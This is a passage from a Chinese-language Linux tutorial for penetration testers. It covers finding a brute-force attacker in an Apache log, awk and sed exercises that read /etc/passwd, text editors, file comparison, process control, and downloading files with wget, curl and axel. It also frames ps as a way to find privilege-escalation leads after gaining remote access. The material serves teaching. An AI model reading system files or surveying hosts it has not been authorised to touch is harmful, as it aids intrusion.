Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/main.css HTTP/1.1\" 304 - \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:49 -0700] \"GET /images/menu/2ny.png HTTP/1.1\" 200 2732 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /chicago/ HTTP/1.1\" 200 7451 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /include/jquery.js HTTP/1.1\" 304 - \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:59 -0700] \"GET /images/header.png HTTP/1.1\" 200 13610 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:11:00 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:13 -0700] \"GET / HTTP/1.1\" 200 4135 \"<http://startuplife.fi/you-know-you-are-in-san-francisco-when-your-favorite-spare-time-activities-include-eating-or-drinking/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:14 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 6227 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# wc -l access.log \n1173 access.log\n```\n\n请注意，该日志文件是基于文本的，包含不同的字段（IP地址、时间戳、HTTP 请求等），并以空格为界。这是一个完美的 “grep 友好型”文件，对于我们到目前为止所涉及的所有工具都能很好地工作。我们将首先搜索这个日志文件中记录的所有 IP 地址向服务器发出的 HTTP 请求。我们将通过管道将 cat 命令的输出输入到 cut 和 sort 命令中来完成这一工作。这可能会给我们提供一个线索，告诉我们需要处理的潜在攻击者的数量。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|cut -d \" \" -f 1|sort -u\n201.21.152.44\n208.115.113.91\n208.54.80.244\n208.68.234.99\n70.194.129.34\n72.133.47.242\n88.112.192.2\n98.238.13.253\n99.127.177.95\n```\n\n我们看到，在日志文件中记录的 IP 地址不到十个，尽管这仍然不能告诉我们关于攻击者的任何信息。接下来，我们使用 uniq 和 sort 来显示唯一的行，进一步细化我们的输出，并按每个 IP 地址访问服务器的次数来排序。uniq 的 `-c` 选项将在输出行前加上出现的次数。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|cut -d \" \" -f 1|sort|uniq -c|sort -urn\n   1038 208.68.234.99\n     59 208.115.113.91\n     22 208.54.80.244\n     21 99.127.177.95\n      8 70.194.129.34\n      1 201.21.152.44\n```\n\n有几个 IP 地址很突出，但我们将首先关注访问频率最高的地址。为了过滤掉 208.67.234.99 这个地址，并显示和计算该 IP 所请求的资源，我们可以使用下面的序列。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|cut -d \"\\\\\"\" -f 2|uniq -c\n   1038 GET //admin HTTP/1.1\n```\n\n从这个输出结果来看，208.68.234.99 的 IP 地址似乎在专门访问 /admin 目录。让我们进一步检查一下。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|grep '/admin'|sort -u   \n208.68.234.99 - - [22/Apr/2013:07:51:20 -0500] \"GET //admin HTTP/1.1\" 401 742 \"-\" \"Teh Forest Lobster\"\n208.68.234.99 - admin [22/Apr/2013:07:51:25 -0500] \"GET //admin HTTP/1.1\" 200 575 \"-\" \"Teh Forest Lobster\"\n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|grep -v '/admin'\n```\n\n显然，208.68.234.99 已经参与了针对这个网络服务器的 HTTP 暴力攻击尝。此外，在大约 1000 次尝试之后，似乎蛮力尝试成功了，正如 “HTTP 200” 信息所显示的那样。\n\n### 练习\n\n1. 使用 /etc/passwd，提取 kali 机器上所有用户的用户和主目录字段，这些用户的 shell 被设置为 /bin/false。确保你使用 Bash 单行代码来打印输出到屏幕上。输出应该类似于下面的样式\n\n   ```bash\n   kali@kali:~$ YOUR COMMAND HERE...\n   The user mysql home directory is /nonexistent\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /var/run/speech-dispatcher\n   The user Debian-gdm home directory is /var/lib/gdm3\n   ```\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# awk -F: '$NF == \"/bin/false\" { printf(\"The user %s home directory is %s\\\\n\", $1, $6)}' /etc/passwd\n   The user mysql home directory is /nonexistent\n   The user tss home directory is /var/lib/tpm\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /run/speech-dispatcher\n   The user lightdm home directory is /var/lib/lightdm\n   ```\n\n2. 将 /etc/passwd 文件复制到你的主目录（/home/kali）\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# cp /etc/passwd /home/kali                                             \n                                                                                                                                                                                                                       \n   ┌──(root💀kali)-[~/Desktop]\n   └─# ls /home/kali \n   Desktop  Documents  Downloads  Music  passwd  Pictures  Public  Templates  Videos\n   ```\n\n3. 在单行程序中使用 cat 来打印 /kali/passwd 的输出，并将 “Gnome Display Manager” 字符串的所有实例替换为 “GDM”\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# cat /etc/passwd|sed 's/\"Gnome Display Manager\"/GDM/'                                     \n   root:x:0:0:root:/root:/usr/bin/zsh\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n   systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n   systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n   systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n   mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n   tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false\n   strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin\n   ntp:x:107:112::/nonexistent:/usr/sbin/nologin\n   messagebus:x:108:113::/nonexistent:/usr/sbin/nologin\n   redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin\n   rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin\n   iodine:x:111:65534::/run/iodine:/usr/sbin/nologin\n   miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\n   _rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin\n   usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n   tcpdump:x:115:121::/nonexistent:/usr/sbin/nologin\n   rtkit:x:116:122:RealtimeKit,,,:/proc:/usr/sbin/nologin\n   sshd:x:117:65534::/run/sshd:/usr/sbin/nologin\n   statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin\n   postgres:x:119:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n   avahi:x:120:126:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\n   stunnel4:x:121:127::/var/run/stunnel4:/usr/sbin/nologin\n   Debian-snmp:x:122:128::/var/lib/snmp:/bin/false\n   speech-dispatcher:x:123:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\n   sslh:x:124:129::/nonexistent:/usr/sbin/nologin\n   nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n   nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n   pulse:x:127:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\n   saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n   inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin\n   colord:x:130:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n   geoclue:x:131:139::/var/lib/geoclue:/usr/sbin/nologin\n   lightdm:x:132:140:Light Display Manager:/var/lib/lightdm:/bin/false\n   king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin\n   kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh\n   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n   dnsmasq:x:134:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n   uuidd:x:135:145::/run/uuidd:/usr/sbin/nologin\n   redis:x:136:146::/var/lib/redis:/usr/sbin/nologin\n   ```\n\n## 从命令行到编辑文件\n\n接下来，让我们来看看在命令 Shell 环境下的文件编辑。这是一项及其重要的 Linux 技能，特别是在渗透测试中，如果你碰巧进入了一个类似 Unix 的操作系统。\n\n虽然有一些文本编辑器，如 gedit 和 leafpad，由于其图形用户界面，可能在视觉上更吸引人，但我们将专注于文本的终端编辑器，它既强调速度又强调多功能性。\n\n说到文本编辑器，每个人似乎都有自己的偏好，但我们将介绍两个最常见的选项的基本使用方法：nano 和 vi。\n\n### Nano\n\nnano 是最简单易用的文本编辑器之一。要打开一个文件并开始编辑，只需运行nano，将文件名作为一个可选参数。\n\n```bash\nkali@kali:~$ nano intro_to_nano.txt\n```\n\n一旦文件被打开，我们可以立即开始对文件进行任何必要的修改，就像我们在图形编辑器中一样。在一个图形编辑器中的做法。如下图所示。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6484aa3a-8ca3-4f81-bc85-fbeabdca3833/Untitled.png)\n\n命令菜单位于屏幕的底部，需要记住的一些最常用的命令包括： `Ctrl` `O` 将修改内容写到文件， `Ctrl` `K` 剪切选中内容， `Ctrl` `U` 粘贴剪切或复制的内容， `Ctrl` `W` 搜索， `Ctrl` `X` 退出。\n\n### Vi\n\nvi 是一个及其强大的文本编辑器，能够以极快的速度运行，特别是当涉及到自动化重复性任务时。然而，它的学习曲线比较陡峭，使用起来远不如 Nano 简单。由于它的复杂性，我们将只介绍最基本的内容。与 Nano 一样，要编辑一个文件，只需将其名称作为参数传给 Vi。\n\n```bash\nkali@kali:~$ vi intro_to_vi.txt\n```\n\n一旦文件被打开，启用插入文本模式开始输入。要做到这一点，按 `i` 键并开始打字。\n\n要禁用插入文本模式并返回到命令模式，请按 `~` 键。在命令模式下，使用 `dd` 删除当前行， `yy` 复制当前行， `p` 粘贴剪切板内容， `x` 删除当前字符， `:w` 将当前文件写入磁盘并停留在 vi 中， `!q` 不将文件写入磁盘就退出， `wq` 保存并退出\n\n由于 vi 看起来很笨拙，许多用户避免使用它。然而，从渗透测试者的角度来看，**vi** 在一个有经验的用户手中可以节省大量的时间，并且 vi 被安装在每一个符合 POSIX 标准的系统上。\n\n请随意自己深入挖掘，vi 的功能相当强大。欲了解更多信息，请参考以下网址：\n\n> https://en.wikibooks.org/wiki/Learning_the_vi_Editor/vi_Reference\n\n> https://www.debian.org/doc/manuals/debian-tutorial/ch-editor.html\n\n## 比较文件\n\n文件比较可能看起来无关紧要，但系统管理员、网络工程师、渗透测试人员、IT 支持技术人员和许多其他以技术为导向的专业人员经常依赖这种技能。\n\n### Comm\n\ncomm 命令对两个文本文件进行比较，显示每个文件特有的行，以及它们的共同性行。它输出三列空间便宜：第一列包含第一个文件或参数所特有的行；第二列包含第二个文件或参数所特有的行；第三列包含两个文件共有的行。选项 `-n` ，其中 “n” 是1、2 或 3，可以用来抑制一个或多个列，取决于需要，让我们看一个例子：\n\n```bash\nkali@kali:~$ cat scan-a.txt\n192.168.1.1\n192.168.1.2\n192.168.1.3\n192.168.1.4\n192.168.1.5\n\nkali@kali:~$ cat scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n192.168.1.6\n\nkali@kali:~$ comm scan-a.txt scan-b.txt                \n                192.168.1.1\n192.168.1.2\n                192.168.1.3\n                192.168.1.4\n                192.168.1.5\n        192.168.1.6\n\nkali@kali:~$ comm -12 scan-a.txt scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n```\n\n在第一个例子中，comm 分别显示了 scan-a.txt 中的第一行、scan-b.txt 中的伟一行以及两个文件夹中发现的行。正在第二个例子中，comm -12 只显示在两个文件夹中发现的行，因为我们抑制了第一和第二列。\n\n### Diff\n\ndiff 命令用于检测文件之间的差异，类似于 comm 命令。然而，diff 要复杂得多，支持许多输出格式。两个最流行的格式包括上下文格式（-c）和统一格式（-u）。\n\n```bash\nkali@kali:~$ diff -c scan-a.txt scan-b.txt\n*** scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n--- scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n***************\n*** 1,5 ****\n  192.168.1.1\n- 192.168.1.2\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n--- 1,5 ----\n  192.168.1.1\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n+ 192.168.1.6\nkali@kali:~$ diff -u scan-a.txt scan-b.txt\n--- scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n+++ scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n@@ -1,5 +1,5 @@\n 192.168.1.1\n-192.168.1.2\n 192.168.1.3\n 192.168.1.4\n 192.168.1.5\n+192.168.1.6\n```\n\n输出中使用 “-” 指示器显示该行出现在第一个文件中，但没有出现在第二个文件中。反之，“+” 指示器显示该行出现在第二个文件中，但没有出现在第一个文件中。\n\n这些格式之间最明显的区别是，统一格式不显示文件之间匹配的行，使结果更短。在这两种格式中，指标的含义是相同的。\n\n### Vimdiff\n\nvimdiff 用多个文件打开 vim，每个窗口都有一个。文件之间的差异被高亮显示，这使得视觉上的检查更加容易。有几个快捷键可能是有用的，比如说：\n\n- do：把另一个窗口中的改动放到当前窗口中。\n- dp：把当前窗口中的变化放到另一个窗口中。\n- ]c：跳转到下一个变化。\n- [c：跳转到上一个变化。\n- `Ctrl` `W` ：切换到另一个分割窗口。\n\n我们来看看一个例子：\n\n```bash\nkali@kali:~$ vimdiff scan-a.txt scan-b.txt\n```\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/edea1d22-8812-4aac-bcd1-94721633a2f2/Untitled.png)\n\n## 管理进程\n\nLinux 内核通过使用进程来管理多任务。内核维护每个进程的信息以帮助保持事情的条理性，每个进程都被分配了一个编号，称为进程 ID（PID）。\n\nLinux Shell 还引入了作业的概念，以简化用户在终端会话中的工作流程。例如 cat error|wc -m 是两个进程的流水线，Shell 将其视为一个作业。作业控制是指有选择地暂停作业的执行，并在以后的时间恢复其执行的能力。这可以通过特定的命令来实现，我们很快就会探讨这个问题。\n\n### 背景进程（bg）\n\n本模块中以前的工作都是在前台运行的，这意味着终端被占用，在当前工作完成之前不能执行其他命令。由于我们的大多数例子都是短小精悍的，所以这并没有造成什么问题。然而，我们将在后面的模块中运行更长、更复杂的命令，我们可以将这些命令发送到后台，以便重新获得对终端的控制权并执行更多的命令。将一个进程转入后台的最快方法是在命令的末尾加上一个安倍号（&），在它启动后立即将其发送到后台。让我们试试一个简单的例子。\n\n```bash\nkali@kali:~$ ping -c 400 localhost > ping_results.txt &\n```\n\n我们用 ping 命令向本地接口发送了 400 个 ICMP 回波请求，并将结果写入一个名为 ping_results.txt 的文件。执行过程自动在后台运行，使 shell 可以自由地进行其他操作。\n\n但是，如果我们忘了在命令的末尾加上安倍号，会发生什么呢？该命令将在前台运行，我们将被迫用 `Ctrl` `C` 取消该命令，或者等到该命令结束后重新获得对终端的控制。另一个选择是在作业已经开始后用 `Ctrl` `Z` 暂停作业。一旦作业被暂停，我们可以通过使用 bg 命令在后台恢复它。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─# bg                                                                           148 ⨯ 1 ⚙\n[1]  + continued  ping -c 400 localhost > ping_results.txt\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─#\n```\n\n工具现在在后台运行，我们可以继续按照我们意愿使用终端。在这样做的时候，请记住，有些进程是对时间敏感的，如果暂停时间过长，可能会给出不正确的结果。例如，在 ping 的例子中，echo 回复可能会回来，但如果数据包进行时进程被暂停，进程可能会错过它，导致不正确的输出。在进行作业控制时，要始终考虑你正在运行的命令的背景。\n\n### 工作控制：jobs 和 fg\n\n为了快速检查我们的 ICMP 回波请求的状态，我们需要使用两个额外的命令：jobs 和 fg。\n\n内置的 jobs 工具列出了当前终端会话中正在运行的工，而 fg 则将一个工作返回到前台。下面是这些命令的操作。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─#  ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# find / -name sbd.exe                                                                    \n^Z\nzsh: suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# jobs                                                                                    \n[1]  - suspended  ping -c 400 localhost > ping_results.txt\n[2]  + suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# fg %1                                                                                   \n[1]  - continued  ping -c 400 localhost > ping_results.txt\n^C                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# jobs                                                                                    \n[2]  + suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# fg                                                                                      \n[2]  - continued  find / -name sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\n首先，奇特的 **^C** 字符代表按键组合 `Ctrl` `C` 。我们可以使用这个快捷键来中止一个长期运行的进程，重新获取对终端的控制。\n\n第二，在 **fg %1** 命令中使用 “%1” 是新的。 在 shell 中，有多种方法来指代一项工作。“%” 字符后面跟着一个 jobID，代表一个工作规范。jobID 可以是一个进程 ID（PID）号码，或者你可以使用以下符号组合。\n\n- %Number：指的是一个工作编号，如 %1 或 %2\n- %String：指的是暂停的命令名称的开头，如 %commandNameHere 或 %ping\n- %+ 或 %%：指的是当前的工作\n- %-：指的是前一个工作\n\n<aside> 💡 如果只有一个进程被置入后台，则不需要工作编号。\n\n</aside>\n\n### 进程控制：ps 和 kill\n\n在大多数类似 Unix 的操作系统中，监视进程最有用的命令之一是 ps（进程状态的简称）。与 jobs 命令不同，ps 列出了全系统的进程，而不仅仅是当前的终端会话。这个工具被认为是类 Unix 操作系统的标准，它的名字被广泛认可，甚至在 Windows PoweShell 中，ps 也是 Get-Process cmdlet 的预定义命令别名，它的作用基本相同。\n\n作为一个渗透测试人员，在获得对系统的远程访问后，首先要检查的是了解被攻击机器上目前正在运行什么软件。这可以帮助我们提升我们的权限或收集更多的信息，以获得对网络的新一步访问。\n\n作为一个例子，让我们启动 Leafpad 文件编辑器，然后尝试使用 ps 命令从命令行中找到其进程 ID（PID）。\n\n```bash\nkali@kali:~$ ps -ef\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 10:18 ?       00:00:02 /sbin/init\nroot           2       0  0 10:18 ?       00:00:00 [kthreadd]\nroot           3       2  0 10:18 ?       00:00:00 [rcu_gp]\nroot           4       2  0 10:18 ?       00:00:00 [rcu_par_gp]\nroot           5       2  0 10:18 ?       00:00:00 [kworker/0:0-events]\nroot           6       2  0 10:18 ?       00:00:00 [kworker/0:0H-kblockd]\nroot           7       2  0 10:18 ?       00:00:00 [kworker/u256:0-events_unbound\nroot           8       2  0 10:18 ?       00:00:00 [mm_percpu_wq]\nroot           9       2  0 10:18 ?       00:00:00 [ksoftirqd/0]\nroot          10       2  0 10:18 ?       00:00:00 [rcu_sched]\n```\n\n我们上面使用的 **-ef** 选项代表了：\n\n- e：选择所有进程\n- f：显示完整的格式列表（UID，PID，PPID，等等）\n\n在这个庞大的列表中找到我们 Leafpad 应用程序绝对不容易，但由于我们知道我们正在寻找的应用程序名称，我们可以使用 -c（按命令名称选择）代替 -e 选项，如下：\n\n```bash\nkali@kali:~$ ps -fC leafpad\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot       56551   56371  1 23:22 pts/0    00:00:00 leafpad\n```\n\n进程搜索返回了一个结果，我们从中收集了 Leafpad 的 PID。花些时间来探索命令手册（man ps），因为 ps 确实是进程管理的瑞士军刀。\n\n假设我们选择想在不同与 GUI 交互的情况下停止 Leafpad 进程。kill 命令在这里可以帮助我们，因为它的目的是向一个进程发送一个特定的信号。为了使用 kill，我们需要我们想发送信号的进程的 PID。由于我们在上一步中收集了 Leafpad 的 PID，我们可以继续。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# kill 56551                                             \n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─#  ps aux | grep leafpad\nroot       56596  0.0  0.0   7616   884 pts/1    S+   23:27   0:00 grep --color=auto leafpad\n```\n\n因为 kill 的默认信号是 SIGTERM（请求终止），我们的应用程序已经被终止了。通过杀死 Leafpad 后使用 ps 验证了这一点。\n\n## 文件和命令监控\n\n在渗透测试过程中，知道如何实时监控文件和命令是非常有价值的。两个有助于完成此类任务的命令是 tail 和 watch。\n\n### Tail\n\ntail 最常见的用途是监视正在写入的日志文件条目。例如，我们可能想监视 Apache 的日志，看看一个 Web 服务器是否被我们试图通过客户端攻击的特定客户联系到。这个例子就可以做到这一点：\n\n```bash\nkali@kali:~$ sudo tail -f /var/log/apache2/access.log\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET / HTTP/1.1\" 200 3380 \"-\" \"Mozilla/5.0\n(X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET /icons/openlogo-75.png HTTP/1.1\" 200\n6040 \"<http://127.0.0.1/>\" \"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\nFirefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] \"GET /favicon.ico HTTP/1.1\" 404 500 \"-\"\n\"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n```\n\n`-f` 选项（follow）是非常有用的，因为它随着目标文件的增长不断地更新输出。另一个方便的选项是 `-nX` ，它输出最后的 “X” 行数，而不是默认值 10。\n\n### Watch\n\nwatch 命令用于定期运行一个特定的命令。默认情况下，它每两秒运行一次，但是我们可以通过使用 `-n` `X` 选项指定不同的间隔。让它每 “X” 秒运行一次。例如，这个命令将每隔 5 秒列出登录的用户（通过 w 命令）一次。\n\n```bash\nkali@kali:~$ watch -n 5 w\n...........\nEvery 5.0s: w                                                 kali: Thu Mar 17 00:28:16 2022\n\n 00:28:16 up 2 days, 18:30,  1 user,  load average: 0.56, 0.82, 0.94\nUSER     TTY      来自           LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     tty7     :0               282月22 15days 10:18  10:18  /usr/lib/xorg/Xorg :0 -seat\n```\n\n要终止 watch 命令并返回到交互式终端，使用 `Ctrl` `C` 。\n\n## 下载文件\n\n接下来，让我们看看一些可以从命令行下载文件到 Linux 系统的工具。\n\n### Wget\n\n我们将广泛使用的 wget 命令，使用 HTTP/HTTPS 和 FTP 协议下载文件。下面显示了 wegt 和 `-O` 选项的使用情况，以在本地机器上用不同的名字保存目标文件。\n\n```bash\nkali@kali:~$ wget -O report_wget.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n--2018-01-28 20:30:04-- <https://www.offensive-security.com/reports/penetration-testin>\nResolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5\nConnecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:4\nHTTP request sent, awaiting response... 200 OK\nLength: 27691955 (26M) [application/pdf]\nSaving to: ‘report_wget.pdf’\nreport_wget.pdf 100%[===================>] 26.41M 766KB/s in 28s\n\n2018-01-28 20:30:33 (964 KB/s) - ‘report_wget.pdf’ saved [27691955/27691955]\n```\n\n### Curl\n\ncurl 是一个使用一系列协议向服务器传输数据的工具，包括 IMAP/S,POP3/S,SCP,SFTP,SMB/S,SMTP/S,TELNET,TFTP 等。渗透测试人员可以用它来下载或上传文件并建立复杂的请求。它最基本的用途与 wget 非常相似。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl -o report.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\n```\n\n### Axel\n\naxel 是一个下载加速器，通过多个连接从 FTP 或 HTTP 服务器传输文件。这个工具有大量的功能，但最常见的是 `-n` ，用来指定要使用的多个连接的数量。在下面的例子中，我们还使用了 `-a` 选项，以获得更简洁的进度指示器，并使用 `-o` 为下载的文件指定一个不同的文件名。\n\n```bash\nkali@kali:~$ axel -a -n 20 -o report_axel.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\nInitializing download: <https://www.offensive-security.com/reports/penetration-testingFile> size: 27691955 bytes\nOpening output file report_axel.pdf\nStarting download\n\nConnection 0 finished\nConnection 1 finished\nConnection 2 finished\nConnection 3 finished\nConnection 4 finished\nConnection 5 finished\nConnection 6 finished\nConnection 7 finished\nConnection 8 finished\nConnection 9 finished\nConnection 10 finished\nConnection 11 finished\nConnection 13 finished\nConnection 14 finished\nConnection 15 finished\nConnection 16 finished\nConnection 18 finished\n[100%]\n[ ..............................................................................................................................................................] [11.1MB/s] [00:00]\n\nDownloaded 26.4 Megabyte in 2 seconds. (11380.17 KB/s)\n```\n\n## 自定义 Bash 环境\n\n### Bash 历史的定制\n\n在本模块的前面，我们讨论了环境变量和历史命令。我们可以使用一些环境变量来改变历史命令的操作和返回数据的方式，最常见的包括 HISTCONTROL、HISTIGNORE 和 HISTTIMEFORMAT。HISTCONTROL 变量定义了是否从历史记录中删除重复的命令、以空格开头的命令或两者。默认情况下，两者都被删除，但你可能会发现只删除重复的命令更有用。\n\n```bash\nkali@kali:~$ export HISTCONTROL=ignoredups\n```\n\nHISTIGNORE 变量对于过滤掉经常运行的基本命令特别有用，入 ls、exit、history、bg 等。\n\n```bash\nkali@kali:~$ export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n\nkali@kali:~$ mkdir test\n\nkali@kali:~$ cd test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ pwd\n/home/kali/test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ history\n 1 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 mkdir test\n 3 cd test\n 4 pwd\n\nkali@kali:~/test$ export HISTTIMEFORMAT='%F %T '\n\nkali@kali:~/test$ history\n 1 2018-02-12 13:37:33 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 2018-02-12 13:37:38 mkdir test\n 3 2018-02-12 13:37:40 cd test\n 4 2018-02-12 13:37:43 pwd\n 5 2018-02-12 